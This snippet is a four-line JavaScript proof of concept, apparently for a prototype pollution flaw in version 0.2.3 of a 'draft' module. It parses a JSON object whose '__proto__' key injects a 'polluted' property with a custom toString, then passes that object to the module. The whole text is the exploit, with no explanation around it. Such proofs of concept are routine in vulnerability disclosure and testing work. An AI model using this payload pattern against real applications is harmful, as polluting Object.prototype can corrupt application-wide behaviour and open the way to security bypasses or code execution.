const draft = require('./draft@0.2.3')
const payload = JSON.parse('{"__proto__": {"polluted": {}}}');
payload.__proto__.polluted.toString = function() { return "yes"; }
draft(undefined, payload)